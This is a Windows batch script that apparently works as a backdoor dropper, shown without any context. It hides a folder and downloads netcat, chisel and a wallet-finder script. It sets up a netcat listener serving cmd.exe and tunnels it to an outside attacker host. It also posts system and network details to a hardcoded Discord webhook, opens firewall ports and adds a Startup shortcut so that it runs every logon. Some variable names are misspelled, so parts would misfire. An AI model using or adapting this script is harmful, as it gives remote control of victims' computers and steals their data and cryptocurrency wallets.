@echo off
rmdir /s /q %homdrive%\Akuma
mkdir %homdrive%\Akuma
attrib +h %homdrive%\Akuma
mkdir %homdrive%\Akuma\nc
%homedrive%
cd %homedrive%\A7uma
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homdrive%\Akuma\nc\nc.exe
curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homdrive%\Akuma\nc\libcrypto-3.dll
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homdrive%\Akuma\chisel.exe
curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homdrive%\Akuma\WalletFinder.bat
cd %homdrive%\Akuma
echo del %homdrive%\Akuma\systeminfo.txt >> %homdrive%\Akuma\zonbi.bat
echo systeminfo ^>^> %homdrive%\Akuma\systeminfo.txt >> %homdrive%\Akuma\zonbi.bat
echo ipconfig /all ^>^> %homdrive%\Akuma\systeminfo.txt >> %homdrive%\Akuma\zonbi.bat
echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homdrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1169439326988411011/KfTclOjQxXCRVbxZtpmyiePMZvF6CpqrFzAXj7-XFQukq_ZrSEa_zT4dfw3mWdwGWfGy >> %homdrive%\Akuma\zonbi.bat
echo :loop >> %homdrive%\Akuma\nc.bat
echo %homdrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homdrive%\Akuma\nc.bat
echo goto loop >> %homdrive%\Akuma\nc.bat
echo :loop >> %homdrive%\Akuma\chisel.bat
echo %homdrive%\Akuma\chisel.exe client akuma.4kum4n0d3z3r0.xyz:32101 R:%random%:localhost:32100 >> %homdrive%\Akuma\chisel.bat
echo goto loop >> %homdrive%\Akuma\chisel.bat
echo netsh advfirewall firewall delete rule name=".akuma" >> %homdrive%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %homdrive%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=out action=allow protocol=TCP localport=32100-32110 >> %homdrive%\Akuma\network.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homdrive%\Akuma\Akuma.vbs
echo objShell.Run "%homdrive%\Akuma\nc.bat", 0, False >> %homdrive%\Akuma\Akuma.vbs
echo objShell.Run "%homdrive%\Akuma\chisel.bat", 0, False >> %homdrive%\Akuma\Akuma.vbs
echo objShell.Run "%homdrive%\Akuma\zonbi.bat", 0, False >> %homdrive%\Akuma\Akuma.vbs
echo objShell.Run "%homdrive%\Akuma\network.bat", 0, False >> %homdrive%\Akuma\Akuma.vbs
echo objShell.Run "%homdrive%\Akuma\WalletFinder.bat", 0, False >> %homdrive%\Akuma\Akuma.vbs
echo y| del "%homdrive%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homdrive%\Akuma\Akuma.vbs';$s.Save()"
start %homdrive%\Akuma\Akuma.vbs
rmdir /s /q %homedrive%\ShiniGami
exit
